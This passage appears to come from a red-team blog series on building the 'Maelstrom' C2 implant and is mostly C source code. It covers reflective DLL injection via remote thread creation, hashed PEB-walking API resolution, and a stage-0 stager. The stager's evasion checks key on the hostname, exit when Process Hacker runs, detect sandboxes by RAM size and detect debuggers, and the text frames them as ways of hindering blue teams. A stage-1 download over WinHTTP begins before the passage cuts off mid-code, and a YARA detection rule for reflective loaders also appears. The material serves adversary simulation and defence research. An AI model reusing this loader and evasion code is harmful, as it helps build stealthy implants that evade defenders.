<p>However, before the thread is created, the <a href="https://stackoverflow.com/a/2174223">Relative Virtual Address</a> (RVA) is calculated by searching the <a href="https://ntopcode.wordpress.com/2018/02/26/anatomy-of-the-process-environment-block-peb-windows-internals/">Process Environment Block</a> (PEB) for the Export Directory, and then all the exports to identify the RDLLs <a href="https://docs.microsoft.com/en-us/cpp/build/exporting-from-a-dll-using-declspec-dllexport?view=msvc-170">Export</a> (which is simply a function exposed from the DLL).</p>
<p>See also: <a href="https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#the-edata-section-image-only">The .edata Section</a>, more on the PEB structure later.</p>
<p>Once the exported address has been found, the offset is added to the base address of the allocated space for the RDLL. Like so:</p>
<pre><code class="language-c">LPVOID lpBuffer = <span class="pl-c1">NULL</span> <span class="pl-c">/* This will be the buffer containing the RDLL */</span>;
        DWORD dwReflectiveLoaderOffset = GetReflectiveLoaderOffset( lpBuffer );
        LPVOID lpRemoteLibraryBuffer = VirtualAllocEx( hProcess, <span class="pl-c1">NULL</span>, dwLength, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE ); 
        LPVOID lpReflectiveLoader = (LPTHREAD_START_ROUTINE)( (ULONG_PTR)lpRemoteLibraryBuffer + dwReflectiveLoaderOffset );
        
</code></pre>
<ul>
<li>First off, <code>lpBuffer</code> can be from anywhere; downloaded from the internet, read from a file, etc. For an implant, its likely downloaded over some sort of channel (<code>HTTP</code>).</li>
<li>With the buffer, it is then cycled through to find the RVA of the exported function.</li>
<li>Now that the offset is determined, and stored in <code>dwReflectiveLoaderOffset</code>, <code>lpRemoteLibraryBuffer</code> will be the base address returned from <code>VirtualAllocEx</code>.</li>
<li>The space is allocated, and the export offset found, they can be added together to get the address of the exported function.</li>
</ul>
<p>All that needs to happen now is for the thread to be created at this point to execute the loader:</p>
<pre><code class="language-c">hThread = CreateRemoteThread( hProcess, <span class="pl-c1">NULL</span>, <span class="pl-c1">1024</span>*<span class="pl-c1">1024</span>, lpReflectiveLoader, lpParameter, (DWORD)<span class="pl-c1">NULL</span>, &amp;dwThreadId );
        
</code></pre>
<p>All of this can be seen in <a href="https://github.com/stephenfewer/ReflectiveDLLInjection/blob/178ba2a6a9feee0a9d9757dcaa65168ced588c12/inject/src/LoadLibraryR.c#L188">LoadRemoteLibraryR</a> from the repository.</p>
<p>The exported function can be seen in the <code>DLLEXPORT</code> of <a href="https://github.com/stephenfewer/ReflectiveDLLInjection/blob/178ba2a6a9feee0a9d9757dcaa65168ced588c12/dll/src/ReflectiveLoader.c#L51">ReflectiveLoader</a>; this is the function the thread triggers on. The code is well documented, so we will not discuss the codebase.</p>
<p>There are some issues with RDLLs, and we will discuss them in the future post in which we perform a static/runtime analysis of the implant. For defenders, make sure there is a signature for the this technique and ensure the <code>ReflectiveLoader</code> string is treated as malicious as seen on <a href="https://otx.alienvault.com/indicator/yara/5f4caf350991b604cb21caf0bbd388a6d6c6c06d">alienvault.com</a>:</p>
<pre><code class="language-json"><span class="pl-ii">import "pe"</span>
        <span class="pl-ii">rule ReflectiveLoader</span>
        {
            <span class="pl-ii">meta: description = "Detects a unspecified hack tool, crack or malware using a reflective loader  no hard match  further investigation recommended"</span>
            <span class="pl-ii">reference = "Internal Research"</span>
            <span class="pl-ii">score = 60</span>
            <span class="pl-ii">strings:</span>
                <span class="pl-ii">$s1 = "ReflectiveLoader" fullword ascii</span>
                <span class="pl-ii">$s2 = "ReflectivLoader.dll" fullword ascii</span>
                <span class="pl-ii">$s3 = "?ReflectiveLoader@@" ascii</span>
            <span class="pl-ii">condition:</span>
            <span class="pl-ii">uint16(0) == 0x5a4d and ( 1 of them or pe.exports("ReflectiveLoader") or pe.exports("_ReflectiveLoader@4") or pe.exports("?ReflectiveLoader@@YGKPAX@Z") )</span>
        }
        
</code></pre>
<p>This is the technique we will follow for Maelstrom.</p>
<h2>Recap of the Execution Flow</h2>
<p>During <a href="https://pre.empt.blog/posts/maelstrom-1">Maelstrom: The C2 Architecture</a> we discussed the execution flow that the implant will take:</p>
<ul>
<li>Stage 0: A Position Independent Loader</li>
<li>Stage 1: Reflective DLL</li>
</ul>
<p>By making the stage 0 loader PIC, we can wrap it into any other form of loader required. Once the Stage 0 executes, it will load a Reflective DLL which will be the main implant (Stage 1).</p>
<p>Simple.</p>
<h2>Stage 0</h2>
<h3>Maelstrom WinAPI Resolution</h3>
<p>Before getting into the stager, we need to cover how Maelstrom resolves WinAPI functions. In order to keep our actual C2s functionality somewhat guarded, we're opting to use publicly accessible code throughout this series. One solution is <a href="https://github.com/paranoidninja/PIC-Get-Privileges/blob/main/addresshunter.h">paranoidninja/PIC-Get-Privileges/blob/main/addresshunter.h</a>, and an alternative could be: <a href="https://github.com/Speedi13/Custom-GetProcAddress-and-GetModuleHandle-and-more/blob/6b444f1db1b7dbe43e7e2b7f499117552a18321f/CustomWinApi.cpp#L168">Speedi13/Custom-GetProcAddress-and-GetModuleHandle-and-more/blob/master/CustomWinApi.cpp#L168</a>.</p>
<p>Parsing the PEB is not a difficult task, and it is all over the internet. <a href="https://github.com/mandiant/capa-rules/blob/954f22acd86611b345454c476d247497295b955d/load-code/pe/parse-pe-header.yml">CAPA even has rules for this</a>. The function from <a href="https://twitter.com/NinjaParanoid">Paranoid Ninja's</a> example:</p>
<pre><code class="language-c">FARPROC <span class="pl-en">GetSymbolAddress</span>(HANDLE hModule, LPCSTR lpProcName) {
            UINT64 uiModuleAddress = (UINT64)hModule;
            UINT64 uiSymbolAddress = <span class="pl-c1">0</span>;
            UINT64 uiExportedAddressTable = <span class="pl-c1">0</span>;
            UINT64 uiNamePointerTable = <span class="pl-c1">0</span>;
            UINT64 uiOrdinalTable = <span class="pl-c1">0</span>;
        
            <span class="pl-k">if</span> (hModule == <span class="pl-c1">NULL</span>) {
                <span class="pl-k">return</span> <span class="pl-c1">0</span>;
            }
        
            PIMAGE_NT_HEADERS NtHeaders = (PIMAGE_NT_HEADERS)(uiModuleAddress + ((PIMAGE_DOS_HEADER)uiModuleAddress)-&gt;<span class="pl-smi">e_lfanew</span>);
            PIMAGE_DATA_DIRECTORY DataDir = (PIMAGE_DATA_DIRECTORY)&amp;NtHeaders-&gt;<span class="pl-smi">OptionalHeader</span>.<span class="pl-smi">DataDirectory</span>[IMAGE_DIRECTORY_ENTRY_EXPORT];
            PIMAGE_EXPORT_DIRECTORY ExportDir = (PIMAGE_EXPORT_DIRECTORY)(uiModuleAddress + DataDir-&gt;<span class="pl-smi">VirtualAddress</span>);
        
            uiExportedAddressTable = (uiModuleAddress + ExportDir-&gt;<span class="pl-smi">AddressOfFunctions</span>);
            uiNamePointerTable = (uiModuleAddress + ExportDir-&gt;<span class="pl-smi">AddressOfNames</span>);
            uiOrdinalTable = (uiModuleAddress + ExportDir-&gt;<span class="pl-smi">AddressOfNameOrdinals</span>);
        
            <span class="pl-k">if</span> (((UINT64)lpProcName &amp; <span class="pl-c1">0xFFFF0000</span>) == <span class="pl-c1">0x00000000</span>) {
                uiExportedAddressTable += ((<span class="pl-c1">IMAGE_ORDINAL</span>((UINT64)lpProcName) - ExportDir-&gt;<span class="pl-smi">Base</span>) * <span class="pl-k">sizeof</span>(DWORD));
                uiSymbolAddress = (UINT64)(uiModuleAddress + <span class="pl-c1">DEREF_32</span>(uiExportedAddressTable));
            }
            <span class="pl-k">else</span> {
                DWORD dwCounter = ExportDir-&gt;<span class="pl-smi">NumberOfNames</span>;
                <span class="pl-k">while</span> (dwCounter--) {
                    <span class="pl-k">char</span>* cpExportedFunctionName = (<span class="pl-k">char</span>*)(uiModuleAddress + <span class="pl-c1">DEREF_32</span>(uiNamePointerTable));
                    <span class="pl-k">if</span> (<span class="pl-c1">Strcmp</span>(cpExportedFunctionName, lpProcName) == <span class="pl-c1">0</span>) {
                        uiExportedAddressTable += (<span class="pl-c1">DEREF_16</span>(uiOrdinalTable) * <span class="pl-k">sizeof</span>(DWORD));
                        uiSymbolAddress = (UINT64)(uiModuleAddress + <span class="pl-c1">DEREF_32</span>(uiExportedAddressTable));
                        <span class="pl-k">break</span>;
                    }
                    uiNamePointerTable += <span class="pl-k">sizeof</span>(DWORD);
                    uiOrdinalTable += <span class="pl-k">sizeof</span>(WORD);
                }
            }
        
            <span class="pl-k">return</span> (FARPROC)uiSymbolAddress;
        }
        
</code></pre>
<p>First, pass in a module base address and cast it to <code>uiModuleAddress</code>:</p>
<pre><code class="language-c">UINT64 uiModuleAddress = (UINT64)hModule;
        
</code></pre>
<p>This is the used to identify the Export Directory, again, this is a standard technique:</p>
<pre><code class="language-c">PIMAGE_NT_HEADERS NtHeaders = (PIMAGE_NT_HEADERS)(uiModuleAddress + ((PIMAGE_DOS_HEADER)uiModuleAddress)-&gt;e_lfanew);
        PIMAGE_DATA_DIRECTORY DataDir = (PIMAGE_DATA_DIRECTORY)&amp;NtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
        PIMAGE_EXPORT_DIRECTORY ExportDir = (PIMAGE_EXPORT_DIRECTORY)(uiModuleAddress + DataDir-&gt;VirtualAddress);
        
</code></pre>
<p>Get the offset of the NT Headers by adding the base address and offsetting it with the DOS Headers to give the <code>e_lfanew</code>. Then, using that value, extract the Data Directory struct. Finally, specifically get the Export Directory by offsetting the module base with the data directories virtual address. Now access to the Export Directory has been achieved.</p>
<p>Now it is just a case of looping through all the exported functions from that directory until the strings match:</p>
<pre><code class="language-c">DWORD dwCounter = ExportDir-&gt;NumberOfNames;
        <span class="pl-k">while</span> (dwCounter--) {
            <span class="pl-k">char</span>* cpExportedFunctionName = (<span class="pl-k">char</span>*)(uiModuleAddress + <span class="pl-c1">DEREF_32</span>(uiNamePointerTable));
            <span class="pl-k">if</span> (<span class="pl-c1">Strcmp</span>(cpExportedFunctionName, lpProcName) == <span class="pl-c1">0</span>) {
                uiExportedAddressTable += (<span class="pl-c1">DEREF_16</span>(uiOrdinalTable) * <span class="pl-k">sizeof</span>(DWORD));
                uiSymbolAddress = (UINT64)(uiModuleAddress + <span class="pl-c1">DEREF_32</span>(uiExportedAddressTable));
                <span class="pl-k">break</span>;
            }
            uiNamePointerTable += <span class="pl-k">sizeof</span>(DWORD);
            uiOrdinalTable += <span class="pl-k">sizeof</span>(WORD);
        }
        
</code></pre>
<p>As <code>strcmp</code> cannot be used without resolving it... its easier to just get the <a href="https://code.woboq.org/userspace/glibc/string/strcmp.c.html">source code</a>:</p>
<pre><code class="language-c"><span class="pl-k">int</span> <span class="pl-en">STRCMP</span>(<span class="pl-k">const</span> <span class="pl-k">char</span>* p1, <span class="pl-k">const</span> <span class="pl-k">char</span>* p2)
        {
            <span class="pl-k">const</span> <span class="pl-k">unsigned</span> <span class="pl-k">char</span>* s1 = (<span class="pl-k">const</span> <span class="pl-k">unsigned</span> <span class="pl-k">char</span>*)p1;
            <span class="pl-k">const</span> <span class="pl-k">unsigned</span> <span class="pl-k">char</span>* s2 = (<span class="pl-k">const</span> <span class="pl-k">unsigned</span> <span class="pl-k">char</span>*)p2;
            <span class="pl-k">unsigned</span> <span class="pl-k">char</span> c1, c2;
            <span class="pl-k">do</span>
            {
                c1 = (<span class="pl-k">unsigned</span> <span class="pl-k">char</span>)*s1++;
                c2 = (<span class="pl-k">unsigned</span> <span class="pl-k">char</span>)*s2++;
                <span class="pl-k">if</span> (c1 == <span class="pl-s"><span class="pl-pds">'</span><span class="pl-cce">\0</span><span class="pl-pds">'</span></span>)
                    <span class="pl-k">return</span> c1 - c2;
            } <span class="pl-k">while</span> (c1 == c2);
            <span class="pl-k">return</span> c1 - c2;
        }
        
        <span class="pl-k">void</span>* <span class="pl-en">MEMSET2</span>(<span class="pl-k">void</span>* dest, <span class="pl-k">int</span> val, <span class="pl-c1">size_t</span> len)
        {
            <span class="pl-k">unsigned</span> <span class="pl-k">char</span>* ptr = dest;
            <span class="pl-k">while</span> (len-- &gt; <span class="pl-c1">0</span>)
                *ptr++ = val;
            <span class="pl-k">return</span> dest;
        }
        
</code></pre>
<p>When <code>STRCMP</code> matches, we return the <code>symbolAddress</code> after the <code>break</code>:</p>
<pre><code class="language-c"><span class="pl-k">return</span> (FARPROC)uiSymbolAddress;
        
</code></pre>
<p>So where is the module base address coming from? Well:</p>
<pre><code class="language-c">LPVOID <span class="pl-en">GetKernel32</span>() {
            LPVOID pKernel32Dll = <span class="pl-c1">NULL</span>;
            pKernel32Dll = <span class="pl-c1">GetModuleByHash</span>(KERNEL32DLL_HASH1);
            <span class="pl-k">if</span> (<span class="pl-c1">NULL</span> == pKernel32Dll) {
                pKernel32Dll = <span class="pl-c1">GetModuleByHash</span>(KERNEL32DLL_HASH2);
                <span class="pl-k">if</span> (<span class="pl-c1">NULL</span> == pKernel32Dll) {
                    pKernel32Dll = <span class="pl-c1">GetModuleByHash</span>(KERNEL32DLL_HASH3);
                    <span class="pl-k">if</span> (<span class="pl-c1">NULL</span> == pKernel32Dll) {
                        <span class="pl-k">return</span> <span class="pl-c1">NULL</span>;
                    }
                }
            }
            <span class="pl-k">return</span> pKernel32Dll;
        }
        
</code></pre>
<p>Three DJB2 hashes are defined:</p>
<pre><code class="language-c">#<span class="pl-k">define</span> <span class="pl-en">KERNEL32DLL_HASH1</span>   <span class="pl-c1">0xa709e74f</span> <span class="pl-c">/// Hash of KERNEL32.DLL</span>
        #<span class="pl-k">define</span> <span class="pl-en">KERNEL32DLL_HASH2</span>   <span class="pl-c1">0xa96f406f</span> <span class="pl-c">/// Hash of kernel32.dll</span>
        #<span class="pl-k">define</span> <span class="pl-en">KERNEL32DLL_HASH3</span>   <span class="pl-c1">0x8b03944f</span> <span class="pl-c">/// Hash of Kernel32.dll</span>
        
</code></pre>
<p>Then, parsing the PEB we can obtain the <code>DLLBase</code>:</p>
<pre><code class="language-c">LPVOID <span class="pl-en">GetModuleByHash</span>(UINT uiModuleHash) {
            PEB* peb = (PEB*)PPEB_PTR;
            <span class="pl-k">if</span> (<span class="pl-c1">NULL</span> == peb) {
                <span class="pl-k">return</span> <span class="pl-c1">NULL</span>;
            }
        
            PEB_LDR_DATA* pLdr = peb-&gt;<span class="pl-smi">Ldr</span>;
            LIST_ENTRY* pListHead = &amp;(pLdr-&gt;<span class="pl-smi">InMemoryOrderModuleList</span>);
            LIST_ENTRY* pListEntry = <span class="pl-c1">NULL</span>;
            LDR_DATA_TABLE_ENTRY_COMPLETED* pLdrEntry;
        
            <span class="pl-k">for</span> (pListEntry = pListHead-&gt;<span class="pl-smi">Flink</span>; pListEntry != pListHead; pListEntry = pListEntry-&gt;<span class="pl-smi">Flink</span>) {
                pLdrEntry = (LDR_DATA_TABLE_ENTRY_COMPLETED*)((PCHAR)pListEntry - <span class="pl-k">sizeof</span>(LIST_ENTRY));
                WCHAR* pwDllName = pLdrEntry-&gt;<span class="pl-smi">BaseDllName</span>.<span class="pl-smi">Buffer</span>;
                UINT wHash = <span class="pl-c1">Djb2HashW</span>(pwDllName);
                <span class="pl-k">if</span> (wHash == uiModuleHash) {
                    <span class="pl-k">return</span> pLdrEntry-&gt;<span class="pl-smi">DllBase</span>;
                }
            }
            <span class="pl-k">return</span> <span class="pl-c1">NULL</span>;
        }
        
</code></pre>
<p>First off, get the PEB Struct:</p>
<pre><code class="language-c">PEB* peb = (PEB*)PPEB_PTR;
        
</code></pre>
<p>Where <code>PPEB_PTR</code> is:</p>
<pre><code class="language-c">#<span class="pl-k">define</span> <span class="pl-en">PPEB_PTR</span> <span class="pl-en">__readgsqword</span>(<span class="pl-c1">0x60</span>)
        
</code></pre>
<p>Read from the offset of <code>0x60</code> gives access to the <a href="https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb">PEB</a>. Next, we can get the <a href="https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb_ldr_data">PEB_LDR_DATA</a> struct by simply accessing it:</p>
<pre><code class="language-c">PEB_LDR_DATA* pLdr = peb-&gt;Ldr;
        
</code></pre>
<p>Then get access to the module list:</p>
<pre><code class="language-c">LIST_ENTRY* pListHead = &amp;(pLdr-&gt;InMemoryOrderModuleList);
        LIST_ENTRY* pListEntry = <span class="pl-c1">NULL</span>;
        LDR_DATA_TABLE_ENTRY_COMPLETED* pLdrEntry;
        
</code></pre>
<p>As seen in the struct:</p>
<pre><code class="language-c"><span class="pl-k">typedef</span> <span class="pl-k">struct</span> _PEB_LDR_DATA {
          BYTE       Reserved1[<span class="pl-c1">8</span>];
          PVOID      Reserved2[<span class="pl-c1">3</span>];
          LIST_ENTRY InMemoryOrderModuleList;
        } PEB_LDR_DATA, *PPEB_LDR_DATA;
        
</code></pre>
<p>Then loop over it until the hashes match. When they do, that will be the DLL required.</p>
<p>Now its a case of casting to the function type, but before that; here is how the APIs are stored:</p>
<pre><code class="language-c"><span class="pl-k">typedef</span> <span class="pl-k">struct</span> API_ {
            LPVOID LoadLibraryA;
            LPVOID CloseHandle;
            LPVOID GlobalMemoryStatusEx;
            LPVOID CreateToolhelp32Snapshot;
            LPVOID Process32NextW;
            LPVOID Process32FirstW;
            LPVOID GetComputerNameW;
            LPVOID Sleep;
            LPVOID WinHttpCloseHandle;
            LPVOID WinHttpQueryDataAvailable;
            LPVOID WinHttpQueryHeaders;
            LPVOID WinHttpReadData;
            LPVOID WinHttpReceiveResponse;
            LPVOID WinHttpSendRequest;
            LPVOID WinHttpSetOption;
            LPVOID WinHttpConnect;
            LPVOID WinHttpOpen;
            LPVOID WinHttpOpenRequest;
            LPVOID WinHttpAddRequestHeaders;
            LPVOID GlobalFree;
            LPVOID malloc;
            LPVOID free;
            LPVOID memset;
            LPVOID VirtualProtect;
            LPVOID VirtualAlloc;
            LPVOID CreateThread;
            LPVOID WaitForSingleObject;
            LPVOID VirtualFree;
        }
        API, * PAPI;
        
</code></pre>
<p>In the case of <code>LoadLibraryA</code>:</p>
<pre><code class="language-c"><span class="pl-k">typedef</span> <span class="pl-en">HMODULE</span>(WINAPI* LOADLIBRARYA)(LPCSTR lpLibFileName);
        CHAR cLoadLibraryA[<span class="pl-c1">13</span>] = { <span class="pl-s"><span class="pl-pds">'</span>L<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>o<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>a<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>d<span class="pl-pds">'</span></span>,<span class="pl-s"><span class="pl-pds">'</span>L<span class="pl-pds">'</span></span>,<span class="pl-s"><span class="pl-pds">'</span>i<span class="pl-pds">'</span></span>,<span class="pl-s"><span class="pl-pds">'</span>b<span class="pl-pds">'</span></span>,<span class="pl-s"><span class="pl-pds">'</span>r<span class="pl-pds">'</span></span>,<span class="pl-s"><span class="pl-pds">'</span>a<span class="pl-pds">'</span></span>,<span class="pl-s"><span class="pl-pds">'</span>r<span class="pl-pds">'</span></span>,<span class="pl-s"><span class="pl-pds">'</span>y<span class="pl-pds">'</span></span>,<span class="pl-s"><span class="pl-pds">'</span>A<span class="pl-pds">'</span></span>,<span class="pl-c1">0</span> };
        Api-&gt;LoadLibraryA = GetSymbolAddress(hKernel32, cLoadLibraryA);
        
</code></pre>
<p>Then using it:</p>
<pre><code class="language-c">CHAR cWinHTTP[<span class="pl-c1">8</span>] = { <span class="pl-s"><span class="pl-pds">'</span>w<span class="pl-pds">'</span></span>,<span class="pl-s"><span class="pl-pds">'</span>i<span class="pl-pds">'</span></span>,<span class="pl-s"><span class="pl-pds">'</span>n<span class="pl-pds">'</span></span>,<span class="pl-s"><span class="pl-pds">'</span>h<span class="pl-pds">'</span></span>,<span class="pl-s"><span class="pl-pds">'</span>t<span class="pl-pds">'</span></span>,<span class="pl-s"><span class="pl-pds">'</span>t<span class="pl-pds">'</span></span>,<span class="pl-s"><span class="pl-pds">'</span>p<span class="pl-pds">'</span></span>,<span class="pl-c1">0</span> };
        HMODULE hWinHttp = ((LOADLIBRARYA)api.LoadLibraryA)(cWinHTTP);
        
</code></pre>
<p>Now onto the stager!</p>
<p>Quick recap of Stage 0. Before running malicious code on a host to get an implant, some initial enumeration and checks are going to be put into place. For an Adversary Simulation exercise, this keeps the attackers within scope, whilst also ensuring that the implant is only executed when it is safe to do so.</p>
<p>Additionally, this entry point will all be Position Independent; meaning that all of the code will be within the <code>.text</code> section, allowing for the opcodes to be extracted, thus giving shellcode to execute in other methods.</p>
<p>Note, Position Independent Code will not be discussed at length within this post, it is recommended to read <a href="https://bruteratel.com/research/feature-update/2021/01/30/OBJEXEC/">Executing Position Independent Shellcode from Object Files in Memory</a>.</p>
<h3>Functionality</h3>
<p>In this section, we want to discuss some functionality that can be added to a stage 0. Obviously, it doesn't need to ALL go in, but its just some things we found interesting and/or useful.</p>
<h4>Environmental Keying</h4>
<p>First up, Environmental Keying, or <a href="https://attack.mitre.org/techniques/T1480/">Guardrailing</a>. This has two purposes:</p>
<ul>
<li>If the Environmental information embedded in the stager does not match what was enumerated, then return.</li>
<li>Encrypt the stage 1 DLL with some information obtained from the environment, and decrypt it at runtime.</li>
</ul>
<p>The second point can be completely automated, this is not something done in Maelstrom, but it easy to send some information back to the C2, and then encrypt the DLL with that information before returning it to the stager.</p>
<p>As far as methods of doing this, there are a ton and quite frankly its down to creativity. A few examples can be shown here:</p>
<ul>
<li><a href="https://mez0.cc/posts/greta-windows-crypto-environmental-keys/">Greta: Windows Crypto, and Recursive Keying</a></li>
<li><a href="https://mez0.cc/posts/when-environmental-keying-meets-dpapi/">When Environmental Keying meets DPAPI</a></li>
<li><a href="https://mez0.cc/posts/environmental-keying-with-securestring/">Using SecureString to protect Malware</a></li>
</ul>
<p>An even easier method is use something like <a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getcomputernamew">GetComputerNameW</a> or <a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getusernamew">GetUserNameW</a>. This is pretty basic and a combination of these types of calls could be used.</p>
<p>In the case of Maelstrom, we simply hash the computername and check it with this function:</p>
<pre><code class="language-c">BOOL <span class="pl-en">IsCorrectEnvironment</span>(API api) {
            WCHAR wHostname[MAX_COMPUTERNAME_LENGTH];
            DWORD dwSz = <span class="pl-k">sizeof</span> wHostname;
        
            <span class="pl-k">if</span> (((GETCOMPUTERNAMEW)api.<span class="pl-smi">GetComputerNameW</span>)(wHostname, &amp;dwSz)) {
                <span class="pl-k">if</span> (<span class="pl-c1">Djb2HashW</span>(wHostname) == HOSTNAME_HASH) {
                    <span class="pl-k">return</span> <span class="pl-c1">TRUE</span>;
                }
            }
            <span class="pl-k">return</span> <span class="pl-c1">FALSE</span>;
        }
        
</code></pre>
<p>Which is called like so:</p>
<pre><code class="language-c"><span class="pl-k">if</span> (IsCorrectEnvironment(Api) == <span class="pl-c1">FALSE</span>) {
            <span class="pl-k">return</span> <span class="pl-c1">FALSE</span>;
        }
        
</code></pre>
<p>To AES256 encrypt a payload using this technique, it can be read in <a href="https://mez0.cc/posts/greta-windows-crypto-environmental-keys/">Greta: Windows Crypto, and Recursive Keying</a>. Maelstrom will not make use of this as this is purely a Proof-of-concept.</p>
<p>So, back to the keying. If the computername doesnt match, then it returns <code>-1</code> and will exit. Otherwise, it moves on.</p>
<h4>Detecting Suspicious Processes</h4>
<p>This is a fun one, it adds an extra layer of hindering blue teams. Its quite simple, if a process is found, exit. In the following example only one process is being checked for, but its not an extra issue to loop over a bunch:</p>
<pre><code class="language-c">BOOL <span class="pl-en">AreSuspiciousProcessesRunning</span>(API Api) {
            HANDLE hSnapshot;
            PROCESSENTRY32W pe32;
        
            hSnapshot = ((CREATETOOLHELP32SNAPSHOT)Api.<span class="pl-smi">CreateToolhelp32Snapshot</span>)(TH32CS_SNAPPROCESS, <span class="pl-c1">0</span>);
            <span class="pl-k">if</span> (hSnapshot == INVALID_HANDLE_VALUE) {
                <span class="pl-k">return</span> <span class="pl-c1">FALSE</span>;
            }
        
            pe32.<span class="pl-smi">dwSize</span> = <span class="pl-k">sizeof</span>(PROCESSENTRY32W);
        
            <span class="pl-k">if</span> (!((PROCESS32FIRSTW)Api.<span class="pl-smi">Process32FirstW</span>)(hSnapshot, &amp;pe32)) <span class="pl-k">return</span> <span class="pl-c1">FALSE</span>;
        
            <span class="pl-k">do</span> {
                <span class="pl-k">if</span> (<span class="pl-c1">Djb2HashW</span>(pe32.<span class="pl-smi">szExeFile</span>) == PROCESS_HACKER_HASH) {
                    <span class="pl-k">return</span> <span class="pl-c1">TRUE</span>;
                }
            } <span class="pl-k">while</span> (((PROCESS32NEXTW)Api.<span class="pl-smi">Process32NextW</span>)(hSnapshot, &amp;pe32));
        
            ((CLOSEHANDLE)Api.<span class="pl-smi">CloseHandle</span>)(hSnapshot);
            <span class="pl-k">return</span> <span class="pl-c1">FALSE</span>;
        }
        
</code></pre>
<p>Loop over all processes, if the hashed value of process is the same as the one defined, then return TRUE. In this case, it is <code>Process Hacker.exe</code>:</p>
<pre><code class="language-c">#<span class="pl-k">define</span> <span class="pl-en">PROCESS_HACKER_HASH</span> <span class="pl-c1">0xda24bd3c</span>
        
</code></pre>
<p>This is executed like so:</p>
<pre><code class="language-c"><span class="pl-k">if</span> (AreSuspiciousProcessesRunning(Api)) {
            <span class="pl-k">return</span> <span class="pl-c1">FALSE</span>;
        }
        
</code></pre>
<h4>Anti-Sandbox</h4>
<p>Sandboxes are a great way to automate and identify what the purpose of malware is. Essentially, they run malware inside an isolated virtual machine, watch its behaviour, report on it.</p>
<p>Commonly, these are small virtual machines with a limited amount of time they can wait. Some common solutions to handling sandboxes:</p>
<ul>
<li>Waiting for the expiration time (usually 180 seconds)</li>
<li>Only executing if not in a virtual machine</li>
<li>Only executing if a disk size is above a certain threshold</li>
</ul>
<p>They are just a few to consider, in the case of maelstrom we simply check RAM size &gt; 4:</p>
<pre><code class="language-c">BOOL <span class="pl-en">IsInSandbox</span>(API Api) {
            MEMORYSTATUSEX memStatus;
        
            memStatus.<span class="pl-smi">dwLength</span> = <span class="pl-k">sizeof</span>(memStatus);
        
            ((GLOBALMEMORYSTATUSEX)Api.<span class="pl-smi">GlobalMemoryStatusEx</span>)(&amp;memStatus);
            <span class="pl-k">float</span> fSz = (<span class="pl-k">float</span>)memStatus.<span class="pl-smi">ullTotalPhys</span> / (<span class="pl-c1">1024</span> * <span class="pl-c1">1024</span> * <span class="pl-c1">1024</span>);
            <span class="pl-k">if</span> (fSz &gt; <span class="pl-c1">4</span>) {
                <span class="pl-k">return</span> <span class="pl-c1">FALSE</span>;
            }
            <span class="pl-k">return</span> <span class="pl-c1">TRUE</span>;
        }
        
</code></pre>
<p>If this function is true, then we continue.</p>
<p>Combined with a sleep:</p>
<pre><code class="language-c"><span class="pl-k">void</span> <span class="pl-en">InternalSleep</span>(API Api, DWORD DwSleep) {
            ((SLEEP)Api.<span class="pl-smi">Sleep</span>)(DwSleep);
        }
        
</code></pre>
<h4>Anti-Debug</h4>
<p>Anti-Debug, again, is about creativity. Repos such as <a href="https://github.com/LordNoteworthy/al-khaser/">LordNoteworthy/al-khaser</a> contain loads of examples of this, however Maelstrom keeps this simple:</p>
<pre><code class="language-c">BOOL <span class="pl-en">IsBeingDebugged</span>() {
            PPEB pPeb = (PPEB)PPEB_PTR;
        
            <span class="pl-k">if</span> (pPeb-&gt;<span class="pl-smi">BeingDebugged</span> == <span class="pl-c1">1</span>) {
                <span class="pl-k">return</span> <span class="pl-c1">TRUE</span>;
            }
            <span class="pl-k">else</span> {
                <span class="pl-k">return</span> <span class="pl-c1">FALSE</span>;
            }
        }
        
</code></pre>
<p>Read the PEB Struct, check if <code>BeingDebugged</code> is set to 1. Simple. Looking at the <a href="https://github.com/LordNoteworthy/al-khaser/tree/master/al-khaser/AntiDebug">AntiDebug section of Al-Khaser</a> there are tons methods, just implement these as/when needed.</p>
<p>These techniques are useful at hindering the blue teams if the payload is retrieved; it will slow them down from identifying the purpose of the malware, as well as furthering identifying the server. This should not be the only method of doing this. For example, if it is debugged and the IPs of the server are found, then there should be server side protections to control which implants are allowed to communicate with the server.</p>
<h4>Downloading the Reflective DLL</h4>
<p>For this, we will use <a href="https://docs.microsoft.com/en-us/windows/win32/winhttp/about-winhttp">WinHTTP</a> as the code is ready an accessible. However, this is a fairly older library and <a href="https://docs.microsoft.com/en-us/windows/win32/wininet/about-wininet">WinInet</a> is more modern. For readability of code, the following struct is defined:</p>
<pre><code class="language-c"><span class="pl-k">typedef</span> <span class="pl-k">struct</span> DLL_ {
            LPVOID Buffer;
            DWORD Size;
        }
        DLL, * PDLL;
        
</code></pre>
<p>And then passed into the function:</p>
<pre><code class="language-c">BOOL <span class="pl-en">GetReflectiveDLL</span>(API api, PDLL Dll)
        
</code></pre>
<p>We'll get to that shortly. But first, the config of the request is defined:</p>
<pre><code class="language-c">WCHAR wVerb[<span class="pl-c1">4</span>] = {
          <span class="pl-s"><span class="pl-pds">'</span>G<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>E<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>T<span class="pl-pds">'</span></span>, <span class="pl-c1">0</span>
        };
        
        WCHAR wEndpoint[<span class="pl-c1">9</span>] = {
